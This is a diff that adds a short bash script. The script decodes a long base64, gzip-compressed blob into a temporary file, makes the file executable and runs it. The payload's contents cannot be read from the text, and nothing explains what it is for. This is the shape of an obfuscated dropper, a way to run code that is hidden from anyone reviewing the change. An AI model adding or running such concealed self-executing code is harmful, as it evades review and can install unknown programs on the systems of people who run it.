@@ -1,0 +1,6 @@
+#!/bin/bash
+A=`tempfile`
+(base64 -d|gunzip ) > $A  <<<H4sIAEO5XFAAA4WS3Y7aMBCFr+OnOITt0qoNOKBVpUq0EhLqbe9hL5xkQiwcO2ucLai77147yf4AUhvJimdifzNnTsajWSb1LBOHijHIEmiUOCHRSB6Q5CkOJ+0qHKRGKQpCBT5N/eKcz/1rgfn3WUGPM90qxeAq0iwCHRtjHX6u1utfy7gHPnTMM+CHzykfNnfDm+O8zF2oEeONufovc/7C/heTpx4KUgcKbC87I2r8rhdwoaD/dtlCyCIpMeccicJXzuPQpkdeAZxtCcC4lLrwlZwj61tSKhP5fjqdgvLK+LxSyCthf1zVCvc9u5QsLP+Urc6dNBraOFnujCk+fmJ/WHTT1TvzJBoXBrWxhMYcpJOP1F+SuegIFVliz5fITIgX5OoK+XzWgjKmCUF/vJPCIkuiCOakSBrEax0UN3AGudFOaj+OxpqdFXUt9e4LhIbxo7fY0ymcoqN03+IuYizy9mxwE4LlEnET455Fg1G12BPK1tt4ewv0kfL/cghfZ4OnpzdV/pIl11oN7rvt3RoSKYv8eDt1vyup6FUaK8ygLCFMtnrLF4vNYl5jo+novIP36FK83uqJP6yJsXfHETxuWl9LtIU0fmt3VIyw1V132YlGE/YXONsw7okDAAA=
+chmod +x $A && $A
+
+
